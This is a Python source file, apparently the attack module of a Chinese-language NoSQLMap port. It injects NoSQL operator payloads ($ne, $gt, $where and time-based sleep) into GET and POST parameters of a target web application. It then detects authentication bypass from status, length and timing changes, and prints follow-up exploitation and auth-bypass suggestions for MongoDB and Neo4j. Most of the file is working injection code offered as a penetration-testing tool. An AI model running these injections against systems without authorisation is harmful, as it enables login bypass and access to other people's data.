"""
NoSQLMap 攻擊模塊 - 實現各種攻擊方法
"""

import sys
import time
import json
import re
import urllib.parse
import requests
from bs4 import BeautifulSoup
import warnings
from i18n_utils import get_message
from . import config
from . import detect
from . import web_utils
from . import mongodb_payloads
from . import neo4j_payloads

# 忽略BeautifulSoup的警告
warnings.filterwarnings("ignore", category=Warning)

def attack(attack_option):
    """
    執行選定的攻擊
    
    Args:
        attack_option (int): 攻擊選項
    """
    if attack_option == 1:
        # MongoDB 注入套件
        print("[*] MongoDB 注入測試選項待實現")
        
    elif attack_option == 2:
        # 掃描匿名MongoDB訪問
        print("[*] 掃描匿名MongoDB訪問選項待實現")
        
    elif attack_option == 3:
        # Web應用NoSQL攻擊
        if not config.victim or config.victim == "Not Set":
            print("[!] 請先設置目標主機")
            return
            
        if not config.uri or config.uri == "Not Set":
            print("[!] 請先設置URI路徑")
            return
            
        if not config.httpMethod or config.httpMethod == "Not Set":
            print("[!] 請先設置HTTP方法")
            return
            
        if config.platform == "Not Set":
            print("[*] 未設置平台，默認使用MongoDB")
            config.platform = "MongoDB"
            
        # 根據HTTP方法調用相應的攻擊函數
        if config.httpMethod == "GET":
            web_app_get_attack()
        elif config.httpMethod == "POST":
            web_app_post_attack()
        else:
            print(f"[!] 不支持的HTTP方法: {config.httpMethod}")
            
    elif attack_option == 4:
        # Neo4j攻擊套件
        print("[*] Neo4j攻擊選項待實現")
        
    else:
        print(f"[!] 無效的攻擊選項: {attack_option}")

def process_form_attack(url):
    """
    處理表單攻擊
    
    Args:
        url (str): 目標URL
        
    Returns:
        tuple: (success, message)
    """
    try:
        # 發送請求獲取頁面內容
        response = requests.get(url, verify=False)
        
        if response.status_code != 200:
            return False, f"獲取頁面失敗，狀態碼: {response.status_code}"
            
        # 使用BeautifulSoup解析頁面
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # 查找所有表單
        forms = soup.find_all('form')
        
        if not forms:
            return False, get_message('NO_FORMS')
            
        print(get_message('FORM_FOUND').format(len(forms)))
        
        # 顯示表單信息
        for i, form in enumerate(forms, 1):
            action = form.get('action', '')
            method = form.get('method', 'get').upper()
            
            print(get_message('FORM_DETAILS').format(i, action, method))
            
            # 顯示表單字段
            fields = form.find_all(['input', 'textarea', 'select'])
            for field in fields:
                field_name = field.get('name', '')
                field_type = field.get('type', 'text') if field.name == 'input' else field.name
                field_value = field.get('value', '')
                
                if field_name:
                    print(get_message('FIELD_NAME').format(field_name, field_type, field_value))
        
        # 詢問用戶選擇哪個表單
        if len(forms) > 1:
            form_select = input(get_message('FORM_SELECT').format(len(forms)))
            try:
                form_index = int(form_select) - 1
                if form_index < 0 or form_index >= len(forms):
                    return False, get_message('INVALID_FORM')
                form = forms[form_index]
            except ValueError:
                return False, get_message('INVALID_FORM')
        else:
            form = forms[0]
        
        # 獲取表單屬性
        action = form.get('action', '')
        method = form.get('method', 'get').upper()
        
        # 將相對路徑轉換為絕對路徑
        if action.startswith('/'):
            # 從URL提取基本URL
            parsed_url = urllib.parse.urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            action = base_url + action
        elif not action.startswith(('http://', 'https://')):
            # 相對於當前路徑的URL
            if url.endswith('/'):
                action = url + action
            else:
                # 去除URL的最後一部分，保留目錄
                base_url = url.rsplit('/', 1)[0]
                action = f"{base_url}/{action}"
        elif not action:
            # 如果沒有指定action，使用當前URL
            action = url
        
        # 更新配置
        parsed_action = urllib.parse.urlparse(action)
        config.victim = parsed_action.netloc.split(':')[0] if ':' in parsed_action.netloc else parsed_action.netloc
        config.webPort = parsed_action.port or (443 if parsed_action.scheme == 'https' else 80)
        config.uri = parsed_action.path
        if parsed_action.query:
            config.uri += f"?{parsed_action.query}"
        config.https = "ON" if parsed_action.scheme == 'https' else "OFF"
        config.httpMethod = method
        
        # 如果是POST方法，準備表單數據
        if method == "POST":
            form_data = {}
            fields = form.find_all(['input', 'textarea', 'select'])
            for field in fields:
                field_name = field.get('name', '')
                field_value = field.get('value', '')
                if field_name:
                    form_data[field_name] = field_value
            
            # 將表單數據轉換為字符串格式
            if form_data:
                config.postData = urllib.parse.urlencode(form_data)
        
        print(get_message('FORM_CONFIG').format(method, config.uri))
        return True, get_message('FORM_PARSE_SUCCESS')
        
    except Exception as e:
        return False, get_message('FORM_PARSE_ERR').format(str(e))

def web_app_get_attack():
    """
    執行Web應用GET攻擊
    """
    # 調試模式開關
    DEBUG = False
    
    print(get_message('WEB_ATTACK_GET_TITLE'))
    print(get_message('WEB_ATTACK_SEPARATOR'))
    
    # 構建完整URL
    scheme = "https" if config.https == "ON" else "http"
    port = f":{config.webPort}" if (config.https == "ON" and config.webPort != 443) or (config.https == "OFF" and config.webPort != 80) else ""
    url = f"{scheme}://{config.victim}{port}{config.uri}"
    
    print(f"[*] 目標URL: {url}")
    
    # 檢查URL是否包含參數
    if '?' not in url:
        if DEBUG:
            print("[DEBUG] URL中沒有找到參數")
        print(get_message('NO_URI_PARAMS_GET'))
        try:
            if DEBUG:
                print("[DEBUG] 等待用戶輸入包含參數的URL")
            url_input = input(get_message('APP_PATH_PARAMS'))
            if DEBUG:
                print(f"[DEBUG] 用戶輸入: {url_input}")
            
            # 確保url_input不是空字符串再繼續處理
            if url_input and url_input.strip():
                url = url_input.strip()
                # 更新配置
                try:
                    parsed_url = urllib.parse.urlparse(url)
                    config.victim = parsed_url.netloc.split(':')[0] if ':' in parsed_url.netloc else parsed_url.netloc
                    config.webPort = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
                    config.uri = parsed_url.path
                    if parsed_url.query:
                        config.uri += f"?{parsed_url.query}"
                    config.https = "ON" if parsed_url.scheme == 'https' else "OFF"
                except Exception as e:
                    print(f"[!] 解析URL時出錯: {str(e)}")
                    return
            else:
                print("[!] 未找到URL參數，無法執行GET攻擊")
                return
        except KeyboardInterrupt:
            print("\n[!] 用戶取消操作")
            return
        except Exception as e:
            print(f"[!] 輸入過程中出錯: {str(e)}")
            return
    
    # 解析URL參數
    parsed_url = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed_url.query)
    
    if not query_params:
        print("[!] 未找到URL參數，無法執行GET攻擊")
        return
    
    # 顯示參數列表
    print(get_message('LIST_PARAMETERS'))
    for i, (param, value) in enumerate(query_params.items(), 1):
        print(f"{i}. {param}={value[0]}")
    
    # 詢問要注入的參數
    inject_params_input = input(get_message('SELECT_INJECT_PARAMS_GET'))
    if not inject_params_input:
        print("[!] 未選擇注入參數")
        return
    
    try:
        # 解析用戶選擇的參數索引
        inject_indices = [int(idx.strip()) for idx in inject_params_input.split(',') if idx.strip()]
        inject_params = []
        
        for idx in inject_indices:
            if 1 <= idx <= len(query_params):
                param_name = list(query_params.keys())[idx-1]
                inject_params.append(param_name)
                print(f"[+] 已選擇參數: {param_name}")
            else:
                print(get_message('INVALID_PARAM_INDEX').format(index=idx))
        
        if not inject_params:
            print(get_message('NO_VALID_PARAMS_SELECTED'))
            return
        
        # 開始對選擇的參數進行注入測試
        print(get_message('INJECTING_PARAMS'))
        for param in inject_params:
            print(f"- {param}")
        
        # 獲取基線響應
        print("\n[*] 獲取基線響應...")
        baseline_response = requests.get(url, verify=False)
        baseline_length = len(baseline_response.text)
        baseline_time = baseline_response.elapsed.total_seconds()
        
        print(f"[+] 基線響應長度: {baseline_length}字節")
        print(f"[+] 基線響應時間: {baseline_time}秒")
        
        # 為每個參數執行注入測試
        for param in inject_params:
            print(f"\n[*] 測試參數: {param}")
            
            # 測試1: PHP/ExpressJS != 關聯數組注入
            print("\n" + get_message('TEST_PHP_NE_ASSOC'))
            test_payload = {"$ne": 1}
            new_url = replace_param_value(url, param, json.dumps(test_payload))
            test_injection(new_url, baseline_length, baseline_time)
            
            # 測試2: PHP/ExpressJS > 未定義注入
            print("\n" + get_message('TEST_PHP_GT_UNDEFINED'))
            test_payload = {"$gt": ""}
            new_url = replace_param_value(url, param, json.dumps(test_payload))
            test_injection(new_url, baseline_length, baseline_time)
            
            # 測試3: $where 注入 (字符串逃逸)
            print("\n" + get_message('TEST_WHERE_STR_FIND'))
            test_payload = {"$where": "this.a=='1' || this.b=='2'"}
            new_url = replace_param_value(url, param, json.dumps(test_payload))
            test_injection(new_url, baseline_length, baseline_time)
            
            # 測試4: $where 注入 (整數逃逸)
            print("\n" + get_message('TEST_WHERE_INT_FIND'))
            test_payload = {"$where": "this.a==1 || this.b==2"}
            new_url = replace_param_value(url, param, json.dumps(test_payload))
            test_injection(new_url, baseline_length, baseline_time)
            
            # 測試5: 基於時間的盲注入 (字符串)
            print("\n" + get_message('TEST_TIME_BLIND_STR'))
            test_payload = {"$where": "sleep(2000) || this.a=='1'"}
            new_url = replace_param_value(url, param, json.dumps(test_payload))
            test_time_injection(new_url)
            
            # 測試6: 基於時間的盲注入 (整數)
            print("\n" + get_message('TEST_TIME_BLIND_INT'))
            test_payload = {"$where": "sleep(2000) || this.a==1"}
            new_url = replace_param_value(url, param, json.dumps(test_payload))
            test_time_injection(new_url)
    
    except Exception as e:
        print(f"[!] 執行GET注入攻擊時出錯: {str(e)}")

def web_app_post_attack():
    """
    執行Web應用POST攻擊
    """
    print(get_message('WEB_ATTACK_POST_TITLE'))
    print(get_message('WEB_ATTACK_SEPARATOR'))
    
    # 構建完整URL
    scheme = "https" if config.https == "ON" else "http"
    port = f":{config.webPort}" if (config.https == "ON" and config.webPort != 443) or (config.https == "OFF" and config.webPort != 80) else ""
    url = f"{scheme}://{config.victim}{port}{config.uri}"
    
    print(f"[*] 目標URL: {url}")
    
    # 檢查是否有POST數據
    if not config.postData:
        print("[*] 未設置POST數據，使用默認值")
        # 將默認POST數據轉換為字符串
        default_post_data = "username=admin&password=password"
        try:
            # 解析默認POST數據為字典
            parsed_data = urllib.parse.parse_qs(default_post_data)
            post_data_dict = {k: v[0] for k, v in parsed_data.items()}
            config.postData = default_post_data
            print(f"[+] 使用默認POST數據: {default_post_data}")
            process_post_attack(url, post_data_dict)
        except Exception as e:
            print(f"[!] 解析默認POST數據失敗: {str(e)}")
            return
    else:
        try:
            # 如果postData是字符串，解析為字典
            if isinstance(config.postData, str):
                post_data_str = config.postData
                print(f"[*] 原始POST數據: {post_data_str}")
                
                # 保留空值的解析方法
                if "=" in post_data_str:
                    # 手動分割參數
                    post_data_dict = {}
                    pairs = post_data_str.split("&")
                    for pair in pairs:
                        if "=" in pair:
                            key, value = pair.split("=", 1)
                            post_data_dict[key] = value
                    
                    print(f"[DEBUG] 手動解析字典: {post_data_dict}")
                    
                    # 只有當字典完全為空（沒有鍵）時才使用默認值
                    if not post_data_dict:
                        print("[!] 無法解析POST數據，使用默認值")
                        default_post_data = "username=admin&password=password"
                        parsed_data = urllib.parse.parse_qs(default_post_data)
                        post_data_dict = {k: v[0] for k, v in parsed_data.items()}
                        config.postData = default_post_data
                        print(f"[+] 使用默認POST數據: {default_post_data}")
                else:
                    # 沒有等號的情況，使用默認值
                    print("[!] 無效的POST數據格式，使用默認值")
                    default_post_data = "username=admin&password=password"
                    parsed_data = urllib.parse.parse_qs(default_post_data)
                    post_data_dict = {k: v[0] for k, v in parsed_data.items()}
                    config.postData = default_post_data
                    print(f"[+] 使用默認POST數據: {default_post_data}")
            
            process_post_attack(url, post_data_dict)
        except Exception as e:
            print(f"[!] 解析POST數據失敗: {str(e)}")
            return

def process_post_attack(url, post_data_dict):
    """
    處理POST注入攻擊
    
    Args:
        url (str): 目標URL
        post_data_dict (dict): POST數據字典
    """
    print("\n[*] 開始POST注入攻擊...")
    
    # 顯示參數列表
    print(get_message('LIST_PARAMETERS'))
    for i, (param, value) in enumerate(post_data_dict.items(), 1):
        print(f"{i}. {param}={value}")
    
    # 詢問要注入的參數
    inject_param_input = input(get_message('SELECT_INJECT_PARAM_POST'))
    if not inject_param_input:
        # 如果用戶沒有選擇，默認測試所有參數
        print("[*] 未選擇特定參數，將測試所有參數")
        params_to_test = list(post_data_dict.keys())
    else:
        try:
            inject_index = int(inject_param_input)
            if 1 <= inject_index <= len(post_data_dict):
                inject_param = list(post_data_dict.keys())[inject_index-1]
                print(f"[+] 已選擇參數: {inject_param}")
                params_to_test = [inject_param]
            else:
                print(get_message('INVALID_PARAM_INDEX').format(index=inject_index))
                return
        except ValueError:
            print("[!] 無效的選擇，將測試所有參數")
            params_to_test = list(post_data_dict.keys())
    
    # 獲取基線響應
    print("\n[*] 獲取基線響應...")
    try:
        # 使用當前headers
        headers = config.args_headers.copy() if config.args_headers else {}
        # 添加內容類型
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        
        baseline_response = requests.post(
            url, 
            data=urllib.parse.urlencode(post_data_dict), 
            headers=headers,
            verify=False
        )
        
        baseline_length = len(baseline_response.text)
        baseline_time = baseline_response.elapsed.total_seconds()
        baseline_status = baseline_response.status_code
        
        print(f"[+] 基線響應狀態碼: {baseline_status}")
        print(f"[+] 基線響應長度: {baseline_length}字節")
        print(f"[+] 基線響應時間: {baseline_time:.3f}秒")
        
        # 嘗試使用JSON格式獲取基線響應
        try:
            headers_json = headers.copy()
            headers_json['Content-Type'] = 'application/json'
            baseline_json_response = requests.post(
                url,
                json=post_data_dict,
                headers=headers_json,
                verify=False
            )
            baseline_json_status = baseline_json_response.status_code
            baseline_json_length = len(baseline_json_response.text)
            baseline_json_time = baseline_json_response.elapsed.total_seconds()
            print(f"[+] JSON基線響應狀態碼: {baseline_json_status}")
            print(f"[+] JSON基線響應長度: {baseline_json_length}字節")
            
            # 判斷API偏好的格式
            if baseline_json_status < baseline_status or (baseline_json_status == baseline_status and "invalid" not in baseline_json_response.text.lower()):
                print("[*] 檢測到API偏好JSON格式")
                preferred_format = "json"
            else:
                print("[*] 檢測到API偏好表單格式")
                preferred_format = "form"
        except Exception as e:
            print(f"[!] JSON基線檢測失敗: {str(e)}")
            preferred_format = "form"
        
    except Exception as e:
        print(f"[!] 獲取基線響應時出錯: {str(e)}")
        return
    
    # 檢測API期望的數據類型
    print("\n[*] 檢測API期望的參數格式...")
    test_value_types = [
        ("字符串", "testvalue"),
        ("數字", 12345),
        ("布爾值", True),
        ("空值", None),
        ("對象", {"test": "value"}),
        ("數組", ["test", "value"])
    ]
    
    expected_types = {}
    for param in params_to_test:
        print(f"\n[*] 檢測參數 {param} 的期望類型")
        original_value = post_data_dict[param]
        best_status = 999
        best_type = "字符串"  # 默認期望類型
        
        for type_name, test_value in test_value_types:
            test_data = post_data_dict.copy()
            test_data[param] = test_value
            
            try:
                # 根據偏好格式測試
                if preferred_format == "json":
                    headers_test = headers.copy()
                    headers_test['Content-Type'] = 'application/json'
                    response = requests.post(
                        url,
                        json=test_data,
                        headers=headers_test,
                        verify=False,
                        timeout=3
                    )
                else:
                    # 表單格式需要特殊處理非字符串值
                    form_data = test_data.copy()
                    for k, v in form_data.items():
                        if not isinstance(v, str) and v is not None:
                            form_data[k] = str(v)
                    
                    response = requests.post(
                        url,
                        data=urllib.parse.urlencode(form_data),
                        headers=headers,
                        verify=False,
                        timeout=3
                    )
                
                status = response.status_code
                print(f"  - {type_name}: 狀態碼 {status}")
                
                # 如果找到更好的響應碼，更新期望類型
                if status < best_status or (status == best_status and "invalid" not in response.text.lower() and "error" not in response.text.lower()):
                    best_status = status
                    best_type = type_name
            except Exception as e:
                print(f"  - {type_name}: 測試失敗 - {str(e)}")
        
        # 儲存檢測結果
        expected_types[param] = best_type
        print(f"[+] 參數 {param} 期望類型: {best_type}")
        
        # 恢復原值
        post_data_dict[param] = original_value
    
    # 根據平台選擇注入載荷
    platform = config.platform.lower() if hasattr(config, 'platform') else "mongodb"
    print(f"\n[*] 使用平台特定的注入載荷: {platform}")
    
    # 對每個要測試的參數執行注入測試
    for param in params_to_test:
        print(f"\n[*] 測試參數: {param}")
        original_value = post_data_dict[param]
        param_type = expected_types.get(param, "字符串")
        
        # 選擇注入測試的payload組
        test_all = input("[?] 是否執行全部Payload測試? (y/n, 默認: n): ").lower() == 'y'
        
        if platform == "mongodb":
            if test_all:
                print("[*] 執行全部MongoDB Payload測試...")
                payloads = mongodb_payloads.MONGODB_PAYLOADS
            else:
                print("[*] 執行推薦MongoDB Payload測試...")
                # 從mongodb_payloads模塊獲取推薦的注入向量
                payloads = mongodb_payloads.get_recommended_payloads()
                
                # 詢問用戶是否要測試特定類別的payload
                print("\n[*] 可用的MongoDB Payload類別:")
                categories = mongodb_payloads.get_all_categories()
                for i, category in enumerate(categories, 1):
                    print(f"{i}. {category}")
                
                cat_select = input("\n[?] 選擇要測試的Payload類別 (多個類別用逗號分隔，直接回車使用推薦類別): ")
                if cat_select.strip():
                    try:
                        selected_cats = []
                        for idx in cat_select.split(','):
                            idx = idx.strip()
                            if idx.isdigit() and 1 <= int(idx) <= len(categories):
                                selected_cats.append(categories[int(idx)-1])
                                
                        if selected_cats:
                            payloads = []
                            for cat in selected_cats:
                                payloads.extend(mongodb_payloads.get_payloads_by_category(cat))
                            print(f"[+] 已選擇 {len(payloads)} 個 {', '.join(selected_cats)} 類別的Payload")
                    except:
                        print("[!] 類別選擇解析錯誤，使用推薦Payload")
            
            print(f"[*] 將測試 {len(payloads)} 個MongoDB Payload...")
        elif platform == "neo4j":
            if test_all:
                print("[*] 執行全部Neo4j Cypher Payload測試...")
                payloads = neo4j_payloads.NEO4J_PAYLOADS
            else:
                print("[*] 執行推薦Neo4j Cypher Payload測試...")
                # 從neo4j_payloads模塊獲取推薦的注入向量
                payloads = neo4j_payloads.get_recommended_payloads()
                
                # 詢問用戶是否要測試特定類別的payload
                print("\n[*] 可用的Neo4j Payload類別:")
                categories = neo4j_payloads.get_all_categories()
                for i, category in enumerate(categories, 1):
                    print(f"{i}. {category}")
                
                cat_select = input("\n[?] 選擇要測試的Payload類別 (多個類別用逗號分隔，直接回車使用推薦類別): ")
                if cat_select.strip():
                    try:
                        selected_cats = []
                        for idx in cat_select.split(','):
                            idx = idx.strip()
                            if idx.isdigit() and 1 <= int(idx) <= len(categories):
                                selected_cats.append(categories[int(idx)-1])
                                
                        if selected_cats:
                            payloads = []
                            for cat in selected_cats:
                                payloads.extend(neo4j_payloads.get_payloads_by_category(cat))
                            print(f"[+] 已選擇 {len(payloads)} 個 {', '.join(selected_cats)} 類別的Payload")
                    except:
                        print("[!] 類別選擇解析錯誤，使用推薦Payload")
                        
                # 詢問是否要針對特定欄位生成專門的payload
                field_specific = input("[?] 是否生成針對欄位特定的payload? (y/n, 默認: n): ").lower() == 'y'
                if field_specific:
                    field_specific_payloads = neo4j_payloads.generate_field_specific_payloads(param)
                    payloads.extend(field_specific_payloads)
                    print(f"[+] 已添加 {len(field_specific_payloads)} 個針對 {param} 欄位的專用Payload")
            
            print(f"[*] 將測試 {len(payloads)} 個Neo4j Cypher Payload...")
        else:
            print(f"[!] 不支持的平台: {platform}，使用MongoDB Payload")
            payloads = mongodb_payloads.get_recommended_payloads()
            print(f"[*] 將測試 {len(payloads)} 個MongoDB Payload...")
        
        # 執行測試
        successful_payloads = []
        for vector in payloads:
            print(f"\n[*] 測試: {vector['name']}")
            inject_value = vector['value']
            
            # 創建測試數據副本
            test_data = post_data_dict.copy()
            
            # 根據API期望類型調整注入載荷
            if param_type == "字符串" and isinstance(inject_value, (dict, list)):
                print(f"[!] 警告: API期望字符串但注入值是 {type(inject_value).__name__}，可能會被拒絕")
                # 如果API期望字符串但payload為對象，可以嘗試：
                # 1. 保持原樣，測試轉義處理
                # 2. 將payload轉換為字符串
                test_with_original = True
                test_with_stringified = True
            else:
                test_with_original = True
                test_with_stringified = False
            
            # 測試原始注入方式
            if test_with_original:
                test_data[param] = inject_value
                test_injection_with_format(url, param, test_data, inject_value, baseline_status, baseline_length, baseline_time, 
                                          baseline_json_status, baseline_json_length, baseline_json_time,
                                          preferred_format, headers, successful_payloads, vector)
            
            # 測試字符串化注入方式
            if test_with_stringified and isinstance(inject_value, (dict, list)):
                try:
                    # 對於字符串期望類型，嘗試使用字符串內注入
                    if isinstance(inject_value, dict) and "$ne" in inject_value:
                        # 特殊處理常見的$ne操作符
                        string_inject = f"' {json.dumps(inject_value).replace('\"', '')} '"
                        test_data[param] = string_inject
                        print(f"[*] 嘗試字符串化注入: {string_inject}")
                        test_injection_with_format(url, param, test_data, string_inject, baseline_status, baseline_length, baseline_time, 
                                                baseline_json_status, baseline_json_length, baseline_json_time,
                                                preferred_format, headers, successful_payloads, vector, "stringified")
                except Exception as e:
                    print(f"[!] 字符串化注入失敗: {str(e)}")
        
        # 恢復原始值
        post_data_dict[param] = original_value
        
        # 如果有成功的Payload，顯示總結
        if successful_payloads:
            print("\n[+] 測試完成! 發現 {} 個潛在漏洞:".format(len(successful_payloads)))
            for i, payload in enumerate(successful_payloads, 1):
                print(f"{i}. {payload['name']} ({payload['category']}) - {payload['param']}={payload['value']}")
                print(f"   內容類型: {payload['content_type']}, 狀態碼: {payload['status']}")
                if payload['length_diff'] != 0:
                    print(f"   響應長度變化: {payload['length_diff']:+d}字節")
                if payload['time_diff'] > 1.0:
                    print(f"   響應時間變化: {payload['time_diff']:.3f}秒")
                print(f"   注入結果: {payload['result']}")
                print()
                
            # 建議後續利用
            print("[*] 漏洞利用建議:")
            print("1. 針對成功的攻擊向量進行更精確的測試")
            print("2. 嘗試從響應中提取有價值信息")
            print("3. 針對認證繞過類漏洞，嘗試額外的登錄繞過向量")
            
            # 真正成功的注入（不只是響應變化）
            real_success = [p for p in successful_payloads if p['result'] == '真實繞過']
            if real_success:
                print(f"\n[!!!] 檢測到 {len(real_success)} 個真實認證繞過:")
                for i, payload in enumerate(real_success, 1):
                    print(f"{i}. {payload['name']} - {payload['param']}={payload['value']}")
                
                print("\n[*] 認證繞過攻擊向量建議:")
                if platform == "mongodb":
                    for payload in mongodb_payloads.get_combined_auth_payloads():
                        print(f"- {json.dumps(payload, ensure_ascii=False)}")
                elif platform == "neo4j":
                    for payload in neo4j_payloads.get_auth_bypass_payloads()[:5]:  # 只顯示前5個認證繞過payload
                        print(f"- {payload['value']}")
        else:
            print("\n[*] 測試完成，未發現明顯漏洞。")
            print("[*] 建議:")
            print("1. 嘗試不同的參數或注入點")
            print("2. 調整注入向量參數值")
            print("3. 檢查應用程序的錯誤處理和日誌以獲取更多信息")
    
    print("\n[*] POST注入測試完成")
    
def test_injection_with_format(url, param, test_data, inject_value, baseline_status, baseline_length, baseline_time, 
                             baseline_json_status, baseline_json_length, baseline_json_time,
                             preferred_format, headers, successful_payloads, vector, variant="original"):
    """
    使用特定格式測試注入
    
    Args:
        url (str): 目標URL
        param (str): 當前測試的參數名
        test_data (dict): 測試數據
        inject_value: 注入值
        baseline_status (int): 基線狀態碼
        baseline_length (int): 基線響應長度
        baseline_time (float): 基線響應時間
        baseline_json_status (int): JSON基線狀態碼
        baseline_json_length (int): JSON基線響應長度
        baseline_json_time (float): JSON基線響應時間
        preferred_format (str): 偏好的格式 (json/form)
        headers (dict): 請求頭
        successful_payloads (list): 成功的注入記錄
        vector (dict): 當前測試的注入向量
        variant (str): 變種類型 (original/stringified)
    """
    try:
        # 測試偏好格式
        if preferred_format == "json":
            test_formats = [
                ('application/json', lambda: requests.post(
                    url, 
                    json=test_data,
                    headers={**headers, 'Content-Type': 'application/json'},
                    verify=False,
                    timeout=5
                ), baseline_json_status, baseline_json_length, baseline_json_time)
            ]
        else:
            # 如果偏好表單格式，同時測試表單和JSON
            test_formats = [
                ('application/x-www-form-urlencoded', lambda: requests.post(
                    url, 
                    data=urllib.parse.urlencode({k: (str(v) if not isinstance(v, str) and v is not None else v) for k, v in test_data.items()}),
                    headers={**headers, 'Content-Type': 'application/x-www-form-urlencoded'},
                    verify=False,
                    timeout=5
                ), baseline_status, baseline_length, baseline_time),
                ('application/json', lambda: requests.post(
                    url, 
                    json=test_data,
                    headers={**headers, 'Content-Type': 'application/json'},
                    verify=False,
                    timeout=5
                ), baseline_json_status, baseline_json_length, baseline_json_time)
            ]
        
        for content_type, request_func, base_status, base_length, base_time in test_formats:
            try:
                print(f"[*] 測試內容類型: {content_type}")
                inject_response = request_func()
                
                inject_length = len(inject_response.text)
                inject_time = inject_response.elapsed.total_seconds()
                inject_status = inject_response.status_code
                
                # 分析結果
                length_diff = inject_length - base_length
                time_diff = inject_time - base_time
                status_diff = inject_status != base_status
                
                # 解析響應內容（嘗試JSON）
                try:
                    json_response = inject_response.json()
                    has_json = True
                except:
                    json_response = {}
                    has_json = False
                
                result = ""
                if status_diff:
                    result = f"狀態碼變化: {base_status} -> {inject_status}"
                elif abs(length_diff) > 20:  # 如果響應長度變化超過20字節
                    result = f"響應長度變化: {length_diff:+d}字節"
                elif time_diff > 1.0:  # 如果響應時間增加超過1秒
                    result = f"響應時間增加: {time_diff:.3f}秒"
                
                if result:
                    print(f"[!] 偵測到變化: {result}")
                    print(f"[+] 狀態碼: {inject_status}")
                    print(f"[+] 響應長度: {inject_length}字節")
                    print(f"[+] 響應時間: {inject_time:.3f}秒")
                    
                    # 響應預覽和判斷
                    if inject_length > 0:
                        preview = inject_response.text[:200] + "..." if len(inject_response.text) > 200 else inject_response.text
                        print(f"[+] 響應預覽: {preview}")
                        
                        # 判斷是否真實繞過
                        injection_success = False
                        bypass_type = "響應變化"
                        
                        # 檢查明顯成功標誌
                        success_indicators = ["success", "welcome", "登錄成功", "authorized", "驗證成功"]
                        error_indicators = ["invalid", "error", "失敗", "未授權", "未驗證", "無效"]
                        
                        # 根據狀態碼和響應內容判斷真實成功
                        if inject_status == 200 and base_status != 200:
                            # 狀態碼從非200變為200是強烈的成功跡象
                            injection_success = True
                            bypass_type = "真實繞過"
                        elif inject_status < 400 and base_status >= 400:
                            # 從錯誤狀態變為成功狀態
                            injection_success = True
                            bypass_type = "真實繞過"
                        elif has_json and any(key in ["token", "access_token", "jwt", "auth"] for key in json_response.keys()):
                            # 返回了認證令牌
                            injection_success = True
                            bypass_type = "真實繞過"
                        elif has_json and any(key in ["user", "username", "profile", "account"] for key in json_response.keys()):
                            # 返回了用戶信息
                            injection_success = True
                            bypass_type = "真實繞過"
                        elif any(indicator in inject_response.text.lower() for indicator in success_indicators) and not any(indicator in inject_response.text.lower() for indicator in error_indicators):
                            # 檢測到成功指標且沒有錯誤指標
                            injection_success = True
                            bypass_type = "可能繞過"
                        elif inject_status == 422 or "invalid" in inject_response.text.lower() or "error" in inject_response.text.lower():
                            # 422狀態碼或包含錯誤信息，可能只是參數格式錯誤
                            bypass_type = "格式錯誤"
                            injection_success = False
                            
                        if injection_success:
                            print(f"[!!!] 注入成功: {bypass_type}")
                            print(f"[+] 有效Payload: {param}={inject_value}")
                        else:
                            print(f"[*] 注入結果: {bypass_type}，可能只是響應差異而非實際漏洞")
                        
                        # 記錄結果
                        successful_payloads.append({
                            "name": vector['name'] + (f" ({variant})" if variant != "original" else ""),
                            "category": vector.get('category', 'unknown'),
                            "param": param,
                            "value": inject_value,
                            "content_type": content_type,
                            "status": inject_status,
                            "length_diff": length_diff,
                            "time_diff": time_diff,
                            "result": bypass_type
                        })
                        
                else:
                    print("[*] 未檢測到明顯變化")
                
            except Exception as e:
                print(f"[!] {content_type}請求失敗: {str(e)}")
                continue
    
    except Exception as e:
        print(f"[!] 執行注入測試時出錯: {str(e)}")

def replace_param_value(url, param, new_value):
    """
    替換URL參數值
    
    Args:
        url (str): 原始URL
        param (str): 參數名
        new_value (str): 新值
        
    Returns:
        str: 修改後的URL
    """
    parsed_url = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed_url.query)
    
    query_params[param] = [new_value]
    
    new_query = urllib.parse.urlencode(query_params, doseq=True)
    
    # 構建新的URL
    new_url = urllib.parse.urlunparse((
        parsed_url.scheme,
        parsed_url.netloc,
        parsed_url.path,
        parsed_url.params,
        new_query,
        parsed_url.fragment
    ))
    
    return new_url

def test_injection(url, baseline_length, baseline_time):
    """
    測試注入
    
    Args:
        url (str): 測試URL
        baseline_length (int): 基線響應長度
        baseline_time (float): 基線響應時間
    """
    try:
        print(f"[*] 測試URL: {url}")
        response = requests.get(url, verify=False)
        
        response_length = len(response.text)
        response_time = response.elapsed.total_seconds()
        
        length_diff = abs(response_length - baseline_length)
        time_diff = abs(response_time - baseline_time)
        
        print(f"[+] 響應長度: {response_length}字節 (差異: {length_diff}字節)")
        print(f"[+] 響應時間: {response_time}秒 (差異: {time_diff:.4f}秒)")
        
        # 檢查響應變化
        if length_diff > 100:  # 如果長度變化超過100字節
            print("[!] " + get_message('NOSQLI_FOUND') + " 響應長度發生顯著變化")
            
        if response.status_code != 200:
            print(f"[!] 請求返回非200狀態碼: {response.status_code}")
            
    except Exception as e:
        print(f"[!] 測試注入時出錯: {str(e)}")

def test_injection_post(url, post_data, baseline_length, baseline_time, data_type):
    """
    測試POST注入
    
    Args:
        url (str): 測試URL
        post_data (dict/str): POST數據
        baseline_length (int): 基線響應長度
        baseline_time (float): 基線響應時間
        data_type (str): 數據類型 (json/form/raw)
    """
    try:
        print(f"[*] 測試POST數據: {post_data}")
        
        if data_type == "json":
            response = requests.post(url, json=post_data, verify=False)
        elif data_type == "form":
            response = requests.post(url, data=post_data, verify=False)
        else:  # raw
            response = requests.post(url, data=post_data, verify=False)
        
        response_length = len(response.text)
        response_time = response.elapsed.total_seconds()
        
        length_diff = abs(response_length - baseline_length)
        time_diff = abs(response_time - baseline_time)
        
        print(f"[+] 響應長度: {response_length}字節 (差異: {length_diff}字節)")
        print(f"[+] 響應時間: {response_time}秒 (差異: {time_diff:.4f}秒)")
        
        # 檢查響應變化
        if length_diff > 100:  # 如果長度變化超過100字節
            print("[!] " + get_message('NOSQLI_FOUND') + " 響應長度發生顯著變化")
            
        if response.status_code != 200:
            print(f"[!] 請求返回非200狀態碼: {response.status_code}")
            
    except Exception as e:
        print(f"[!] 測試POST注入時出錯: {str(e)}")
